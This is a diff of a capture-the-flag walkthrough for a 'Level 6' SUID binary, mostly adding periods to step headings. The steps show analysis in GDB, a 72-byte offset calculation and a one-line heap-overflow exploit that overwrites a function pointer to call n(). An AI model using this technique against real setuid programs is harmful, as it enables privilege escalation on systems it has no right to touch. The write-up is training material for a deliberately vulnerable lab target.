@@ -1,12 +1,12 @@
 # Level 6 Walkthrough
 
-1. **Connect to the target machine**
+1. **Connect to the target machine.**
 
 	```bash
 	ssh level6@<vm-ip> -p 4242
 	```
 
-2. **Check the files**
+2. **Check the files.**
 
 	```bash
 	ls -l
@@ -18,9 +18,7 @@
 	-rwsr-s---+ 1 level7 users 5138 Mar  6  2016 level6
 	```
 
-	This is a SUID binary owned by `level7`.
-
-3. **Test the binary**
+3. **Test the binary.**
 
 	```bash
 	./level6
@@ -32,13 +30,13 @@
 	Segmentation fault (core dumped)
 	```
 
-4. **Copy the binary locally for analysis**
+4. **Copy the binary locally for analysis.**
 
 	```bash
 	scp -P 4242 level6@<vm-ip>:/home/user/level6/level6 .
 	```
 
-5. **Analyze with GDB**
+5. **Analyze with GDB.**
 
 	```bash
 	gdb level6
@@ -62,7 +60,7 @@
 
 	This is a **heap overflow**: overwriting the function pointer allows us to execute any function, e.g., `n()`.
 
-6. **Find target function address**
+6. **Find target function address.**
 
 	From GDB:
 
@@ -70,7 +68,7 @@
 	Address of n(): 0x08048454
 	```
 
-7. **Calculate overflow offset**
+7. **Calculate overflow offset.**
 
 	* First allocation: 64 bytes
 	* Pointer to next allocation: + 4 bytes for malloc overhead
@@ -78,7 +76,7 @@
 
 	Total = `64 + 4 + 4 = 72` bytes until function pointer.
 
-8. **Build and execute exploit**
+8. **Build and execute exploit.**
 
 	```bash
 	./level6 $(printf 'A%.0s' {1..72}; printf '\x54\x84\x04\x08')
